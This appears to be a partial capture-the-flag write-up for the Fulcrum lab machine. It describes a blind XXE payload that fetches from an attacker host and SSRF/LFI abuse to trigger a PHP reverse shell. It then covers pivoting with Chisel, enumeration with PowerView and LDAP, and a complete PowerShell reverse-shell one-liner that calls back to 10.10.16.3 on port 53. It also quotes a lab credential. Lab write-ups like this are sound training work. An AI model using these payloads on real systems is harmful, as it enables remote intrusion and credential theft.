...
### Host entries
```bash
10.10.10.62 upload.fulcrum.local dc.fulcrum.local
```
...
You can often detect blind XXE triggering the out-of-band network interaction to a system that you control. For example, you would define an external entity as follows[^xml-external-entities]:
```xml
...
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://10.10.16.3/structure.xml"> %xxe; %param1;]>
...
Since we already know that in port 80 there is a service with a potential SSRF vulnerability, we can try to use our Blind XXE [^blind-xxe] to abuse this SSRF and call a php reverse shell from our web server but using a localhost call to such web page:
```bash
# Burpsuite payload
...
As we can see the request is appending a .php extension at the end of the endpoint called from this LFI payload, so we can conclude that it is expecting a PHP file, we can abuse of this and provide a reverse shell on this php to lead the server to provide a reverse shell: [^rev-shell-php]
```php
<?php
...
```
By executing a host discovery script we can get the available Hosts on the network. [^hosts-scanner]
...
```
IP 192.168.122.228 is also active so now we can create a port Discovery [^port-scanner] script to check which ports are open:
```bash
#!/bin/bash
...
M4ng£m£ntPa55
```
Then, since we already discovered that the port 5985 is open on the remote host (192.168.122.228) we can use [Chisel](https://shuciran.github.io/posts/Chisel/) [^simple-pivoting] to forward our traffic to it:
```bash
# On kali
...
To further enumerate the machine, since we already have credentials, we can upload [PowerView](https://shuciran.github.io/posts/PowerView-Modules/) to the machine: [^powerview-getdomain-user]
```powershell
...
Indeed there is another active machine, we can abuse of Invoke-Command module to execute commands on this machine so let's start by adding the credentials on memory: [^invoke-command]
```bash
...
```
Since this is possible, we can execute a powershell [Reverse Shells](https://shuciran.github.io/posts/Reverse-Shells/) as follows: [^rev-powershell]
```bash
...
```
##### Option #2
We can execute chisel[^double-pivoting] on the `WEBSERVER` machine and get access to all its ports from Kali, this can be achieved with the following approach:
...
A diagram is to be shown in the following screenshot:
...
Now that we have access to the LDAP[^ldap-auth-enum] port we can enumerate the port tcp-389 with `ldapsearch` authenticated and we find the following credential:
```bash
...
*PS> Invoke-Command -ComputerName file.fulcrum.local -Credential $Creds -ScriptBlock { whoami }
```
Since this is possible, we can execute a powershell [Reverse Shells](https://shuciran.github.io/posts/Reverse-Shells/) as follows:
```powershell
Invoke-Command -ComputerName file.fulcrum.local -Credential $Creds -ScriptBlock { $client = New-Object System.Net.Sockets.TCPClient('10.10.16.3',53);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() }
```
And we get access to this system, it is important to highlight that only port 53 is not firewalled:
...
Now that we are inside the `file.fulcrum.local` device, we can enumerate SMB Shares within the machine: [^get-smbshare]
```powershell
...
```
Only important credentials for us are for user "Administrator" or "923a" so let's search[^select-string] for any of them on the share: 
```powershell
...
[^hosts-scanner]: One liner to discover hosts on a Linux machine
[^port-scanner]: Port Discover Script
[^xml-external-entities]: XXE External Entity approach
[^blind-xxe]: Blind XXE Out of Band
[^select-string]: Search a string pattern within a provided path
[^simple-pivoting]: Chisel Simple Pivoting
[^double-pivoting]: Double Pivoting with Chisel
[^ldap-auth-enum]: LDAP Authenticated Enumeration
[^rev-powershell]: Reverse Shell Powershell
[^invoke-command]: Invoke-Command cmdlet to execute commands
[^get-smbshare]: Get-SMBShare cmdlet to enumerate the SMB shares on a system
[^rev-shell-php]: Reverse Shell with PHP
[^powerview-getdomain-user]: Get-DomainUser cmdlet from Powerview to enumerate domain users from DC
